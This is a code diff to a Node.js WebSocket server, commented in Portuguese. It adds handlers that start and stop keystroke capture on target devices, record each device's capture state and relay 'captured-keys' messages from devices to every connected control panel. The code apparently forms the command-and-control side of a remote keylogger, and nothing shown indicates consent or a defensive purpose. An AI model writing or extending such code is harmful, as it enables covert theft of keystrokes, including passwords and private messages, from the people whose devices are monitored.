@@ -675,10 +675,64 @@ wss.on('connection', (ws, req) => {
           }
           break;
         }
+
+        case 'start-capture': {
+          const target = clients.get(msg.targetId);
+          if (target?.ws.readyState === 1) {
+            target.ws.send(JSON.stringify({ type: 'start-capture' }));
+          }
+          if (allDevices[msg.targetId]) {
+            allDevices[msg.targetId].capturing = true;
+            saveDevices();
+          }
+          break;
+        }
+
+        case 'stop-capture': {
+          const target = clients.get(msg.targetId);
+          if (target?.ws.readyState === 1) {
+            target.ws.send(JSON.stringify({ type: 'stop-capture' }));
+          }
+          if (allDevices[msg.targetId]) {
+            allDevices[msg.targetId].capturing = false;
+            saveDevices();
+          }
+          break;
+        }
+
+        case 'get-capture-state': {
+          const device = allDevices[msg.targetId];
+          ws.send(JSON.stringify({
+            type: 'capture-state',
+            targetId: msg.targetId,
+            capturing: device?.capturing || false
+          }));
+          break;
+        }
       }
     } catch (err) {
       console.error('Error:', err.message);
     }
+  });
+
+  // Handler para mensagens do cliente
+  ws.on('message', (data) => {
+    try {
+      const msg = JSON.parse(data.toString());
+
+      // Encaminhar teclas capturadas para todos os painéis conectados ao dispositivo
+      if (msg.type === 'captured-keys' && msg.clientId) {
+        panels.forEach((panel) => {
+          if (panel.ws.readyState === 1) {
+            panel.ws.send(JSON.stringify({
+              type: 'captured-keys',
+              clientId: msg.clientId,
+              keys: msg.keys
+            }));
+          }
+        });
+      }
+    } catch (e) {}
   });
 
   ws.on('close', () => {
